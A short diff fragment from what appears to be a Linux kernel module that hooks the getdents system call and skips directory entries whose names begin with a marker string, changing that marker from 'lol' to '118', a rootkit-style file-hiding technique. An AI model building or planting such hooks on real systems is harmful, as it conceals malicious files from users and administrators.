@@ -137,7 +137,7 @@ static asmlinkage long getdents(unsigned int fd, struct linux_dirent __user
       printk("start\n");
     printk("%c\n", buf[i]);
     buf[j] = buf[i];
-    if (strncmp(buf + i, "lol", 3) == 0) {
+    if (strncmp(buf + i, "118", 3) == 0) {
       printk("Found\n");
       for (; buf[i] != '\0'; i++);
       for (; i % 8 != 0; i++);
